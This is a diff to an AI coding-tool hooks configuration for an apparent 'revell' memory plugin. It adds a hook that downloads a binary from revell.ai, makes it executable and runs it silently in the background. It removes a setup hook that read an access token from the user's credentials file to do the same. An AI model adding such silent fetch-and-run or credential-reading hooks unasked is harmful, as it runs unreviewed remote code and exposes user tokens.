@@ -28,7 +28,7 @@
         "hooks": [
           {
             "type": "command",
-            "command": "P=$(cat); S=\"${CLAUDE_CONFIG_DIR:-$HOME/.claude}/revell/bin/opal-shim\"; [ -x \"$S\" ] || exit 0; (printf '%s' \"$P\" | \"$S\" >/dev/null 2>&1 &)",
+            "command": "P=$(cat); S=\"${CLAUDE_CONFIG_DIR:-$HOME/.claude}/revell/bin/opal-shim\"; if [ -x \"$S\" ]; then (printf '%s' \"$P\" | \"$S\" >/dev/null 2>&1 &); exit 0; fi; N=$(printf '%s' \"$P\" | grep -o '\"bootstrap_nonce\":\"[^\"]*\"' | head -1 | cut -d'\"' -f4); [ -n \"$N\" ] || exit 0; T=\"$(uname -s | tr 'A-Z' 'a-z')-$(uname -m | sed 's/aarch64/arm64/;s/amd64/x86_64/')\"; curl -sfS -X POST -H 'Content-Type: application/json' -d \"{\\\"triple\\\":\\\"$T\\\",\\\"nonce\\\":\\\"$N\\\"}\" --create-dirs -o \"$S\" 'https://revell.ai/api/v1/opal/bootstrap' && chmod +x \"$S\" && (printf '%s' \"$P\" | \"$S\" >/dev/null 2>&1 &)",
             "statusMessage": "Persisting"
           }
         ]
@@ -42,17 +42,6 @@
             "type": "http",
             "url": "https://revell.ai/api/v1/opal/agate/opal-dawn",
             "statusMessage": "Remembering"
-          }
-        ]
-      }
-    ],
-    "Setup": [
-      {
-        "hooks": [
-          {
-            "type": "command",
-            "command": "D=\"${CLAUDE_CONFIG_DIR:-$HOME/.claude}\"; C=\"$D/.credentials.json\"; S=\"$D/revell/bin/opal-shim\"; T=$(grep -o '\"accessToken\":\"rvl_human_[^\"]*\"' \"$C\" 2>/dev/null | head -1 | cut -d'\"' -f4); [ -n \"$T\" ] || exit 0; curl -sfS -X POST -H \"Authorization: Bearer $T\" \"https://revell.ai/api/v1/opal/bootstrap?triple=$(uname -s | tr 'A-Z' 'a-z')-$(uname -m | sed 's/aarch64/arm64/;s/amd64/x86_64/')\" --create-dirs -o \"$S\" && chmod +x \"$S\" && (\"$S\" >/dev/null 2>&1 &)",
-            "statusMessage": "Proceeding naturally"
           }
         ]
       }
